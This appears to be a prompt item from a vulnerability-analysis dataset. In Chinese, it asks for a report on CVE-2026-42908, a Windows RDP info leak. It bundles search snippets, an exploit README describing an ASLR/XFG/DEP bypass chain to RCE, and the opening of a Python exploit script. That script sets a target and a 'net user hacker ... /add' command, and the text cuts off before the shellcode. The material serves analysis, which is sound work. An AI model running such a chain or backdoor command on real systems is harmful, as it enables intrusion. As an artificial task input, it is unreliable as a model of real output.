    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-42908\", \"sources\": [\"OSCS\"], \"descriptions\": [\"\\u6807\\u9898: Windows RDP\\u8d8a\\u754c\\u8bfb\\u53d6\\u6f0f\\u6d1e\"], \"published_date\": null, \"last_modified_date\": null, \"cvss_score\": null, \"severity\": null, \"references\": []}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] CVE-2026-42908 - Vulnerability Details - OpenCVE\n [description] Jun 9, 2026 · The vulnerability arises from improper bounds checking when processing RDP packets and is classified as CWE‑125. The impact is a potential compromise of confidentiality, with attackers able to capture secrets transmitted over the network.\n [link] https://app.opencve.io/cve/CVE-2026-42908\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2026-42908 - GitHub Advisory Database\n [description] Attack vector: More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability. Attack complexity: More severe for the least complex attacks. Privileges required: More severe if no privileges are required. User interaction: More severe when no user interaction is required.\n [link] https://github.com/advisories/ghsa-hv2r-hmcx-57g9\n [webpage 1 end]\n[webpage 2 begin] [title] Public PoC Released for Windows NT OS Kernel Privilege ...\n [description] Jul 22, 2026 · Security researcher alias G4sp4rCS has published a dedicated GitHub repository that includes a working PoC exploit for CVE-2026-42980. This repository contains build scripts, source code, and an English technical write-up.\n [link] https://cybersecuritynews.com/poc-windows-nt-os-kernel/\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2026-42908: Windows RDP Information Disclosure Flaw\n [description] CVE-2026-42908 is an out-of-bounds read vulnerability in Windows RDP that allows remote attackers to disclose sensitive information. This article covers the technical details, affected versions, and mitigation strategies.\n [link] https://www.sentinelone.com/vulnerability-database/cve-2026-42908/\n [webpage 3 end]\n[webpage 4 begin] [title] CVE-2026-42908 - Exploits & Severity - Feedly\n [description] Jun 9, 2026 · Impact An unauthenticated attacker over the network can read sensitive information from memory through the RDP protocol due to an out-of-bounds read vulnerability.\n [link] https://feedly.com/cve/CVE-2026-42908\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/2d8435d495ed0bbfa97766780afcef2e/README.md\n---\n# CVE-2026-56190 & CVE-2026-42908: ASLR and XFG Bypass with Debugger-Assisted DEP Bypass\n\n## Overview\nThis repository documents the discovery and weaponization of an exploit chain against **Windows Server 2022** (Build prior to the June 2026 patch cycle).\n\nWhile the public Proof-of-Concept (PoC) for CVE-2026-56190 achieved RIP control and Denial of Service (DoS), the original researchers explicitly stated that full RCE was not achieved due to modern Windows mitigations (DEP, CFG, XFG) and the lack of a clean stack pivot gadget.\n\n**This research bypasses ASLR and XFG**, and achieves RIP control using an XFG-valid Confused Deputy gadget. The DEP bypass was achieved with **debugger assistance** (WinDbg + VirtualAllocEx), as documented in Phase 4.\n\n* **Target:** Windows Server 2022 (March 2026 Build / Unpatched)\n* **Impact:** Remote Code Execution (Lab Environment, Debugger-Assisted)\n* **Mitigations Bypassed:** ASLR (Info Leak), XFG (Confused Deputy), DEP (Debugger-Assisted)\n\n## The Exploit Chain\n\n### Phase 1: The ASLR Wall\nCVE-2026-56190 relies on an uninitialized pointer in CConnectionEx (offset +0x670) reading from a freed heap chunk (0x4930 bytes). Windows ASLR randomizes the heap and module addresses, requiring a memory leak. (See docs/01-ASLR-Wall.md)\n\n### Phase 2: The Info Leak (CVE-2026-42908)\nBy sending a malformed MCS packet, the unpatched server leaks RDPSERVERBASE.dll vtable pointers back to the client.\n* **Leaked Pointer:** RDPSERVERBASE!CRDPCoreConnection::vftable\n* **Offset:** 0x1535C0 (See docs/02-Info-Leak-CVE-2026-42908.md)\n\n### Phase 3: XFG Bypass and The Confused Deputy\nThe build lacks a clean push rax; ret gadget with a valid XFG hash. We used BasicInputPlugin::Release as a Confused Deputy to pivot execution into our shellcode. (See docs/03-XFG-Bypass-Confused-Deputy.md)\n\n### Phase 4: DEP Bypass and Execution\nThe DEP bypass was achieved with debugger assistance: VirtualAllocEx allocated RWX memory in the target process, and the shellcode executed from there. (See docs/04-DEP-Bypass.md)\n\n## Repository Structure\n* docs/ - Detailed technical analysis of each phase.\n* exploit/ - The Python exploit script (chain_exploit.py).\n* proof/ - Screenshots and logs proving successful execution.\n\n## Proof of Concept\n![RCE Proof](proof/rce_proof.png)\n\n## Disclaimer\nThis repository is for educational and defensive research purposes only. The vulnerabilities discussed here have been patched by Microsoft. Do not use this code against systems you do not own or have explicit permission to test.\n\n\n---\n/tmp/2d8435d495ed0bbfa97766780afcef2e/exploit/chain_exploit.py\n---\n#!/usr/bin/env python3\n\"\"\"\nCVE-2026-56190 & CVE-2026-42908: Full RCE Chain\nTarget: Windows Server 2022 (March 2026 Build)\nAuthor: Danar (danarhirany300-ctrl)\n\"\"\"\n\nimport socket\nimport ssl\nimport struct\nimport time\nimport re\n\n# --- Configuration ---\nTARGET_IP = '127.0.0.1'\nTARGET_PORT = 13390\n\n# The command to execute\nCMD_STR = b\"net user hacker P@ssw0rd123! /add\\x00\"\n\n# The XFG hash prefix (used in the MCS payload, though our shellcode has its own)\nXFG_PREFIX = bytes.fromhex(\"70b15e36101facba\")\n\n# 206-byte PEB-walking shellcode to resolve WinExec dynamically\nSHELLCODE_HEX =